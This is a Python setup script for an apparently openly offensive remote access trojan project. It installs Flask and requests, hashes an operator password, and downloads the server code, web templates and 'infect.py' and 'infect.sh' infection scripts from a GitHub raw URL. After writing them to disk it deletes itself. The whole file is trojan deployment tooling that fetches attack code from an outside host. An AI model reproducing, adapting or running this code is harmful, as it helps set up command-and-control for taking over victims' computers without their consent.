from hashlib import sha256
import getpass
import sys
import os

RAW_URL = "https://raw.githubusercontent.com/fxndone/Online-Flask-Remote-Access-Trojan/main"

def main():
    # install modules

    os.system(f"{sys.executable} -m pip install --upgrade flask")
    os.system(f"{sys.executable} -m pip install --upgrade requests")

    try:
        import requests
    except:
        print("[!] Please install requests manualy !")
        sys.exit(1)
    
    # ask password

    password = getpass.getpass("[?] Please enter your password : ")

    # download files

    main_file      = requests.get(f"{RAW_URL}/server/files/main.py")
    index_file     = requests.get(f"{RAW_URL}/server/files/templates/index.html")
    not_found_file = requests.get(f"{RAW_URL}/server/files/templates/404.html")
    
    infect_py      = requests.get(f"{RAW_URL}/server/files/infect.py")
    infect_sh      = requests.get(f"{RAW_URL}/server/files/infect.sh")

    # save files

    if not os.path.isdir("templates/"):
        os.mkdir("templates/")

    with open("main.py", 'w+') as f:
        f.write(main_file.text.replace("{HASHED_PASSWORD}", sha256(password.encode()).hexdigest()))
        f.close()
    
    with open("templates/index.html", 'w+') as f:
        f.write(index_file.text)
        f.close()
    
    with open("templates/404.html", 'w+') as f:
        f.write(not_found_file.text)
        f.close()

    with open("infect.py", 'w+') as f:
        f.write(infect_py.text)
        f.close()

    with open("infect.sh", 'w+') as f:
        f.write(infect_sh.text)
        f.close()

    # auto remove itself

    os.remove(sys.argv[0])

if __name__ == "__main__":
    main()
